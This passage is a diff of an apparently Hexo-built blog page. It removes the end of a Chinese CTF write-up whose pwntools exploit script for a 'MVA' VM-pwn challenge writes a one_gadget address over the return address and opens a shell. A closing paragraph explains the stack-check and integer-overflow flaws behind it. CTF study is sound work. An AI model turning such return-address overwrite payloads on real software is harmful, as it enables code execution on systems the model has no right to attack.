class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0xE</span>)</span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># one_gadget address got</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">payload += mov(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># write one_gadget address to return_addr</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for c in payload:</span></span><br><span class="line"><span class="comment"># 	print(&#x27;%02x&#x27; % c, end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+] Welcome to MVA, input your code now :&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="3.png" alt="" /></p>
-<p>当shell拿到之后，我们发现这种题目其实并不难，只要计算一下地址然后写入就行了。就是分析代码比较麻烦，需要明确每一种指令分别代表什么含义，找到里面的漏洞进而思考如何getshell。从这道题可以看出，vm-pwn题中最为致命的就是堆栈检查不严格，可能会产生任意地址读写漏洞，还有整型溢出问题也值得关注。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -3506,7 +4047,7 @@ Step 5: getshell</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">137</span>
+          <span class="site-state-item-count">138</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -3564,7 +4105,7 @@ Step 5: getshell</p>
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">18:21</span>
+    <span title="Reading time total">18:27</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
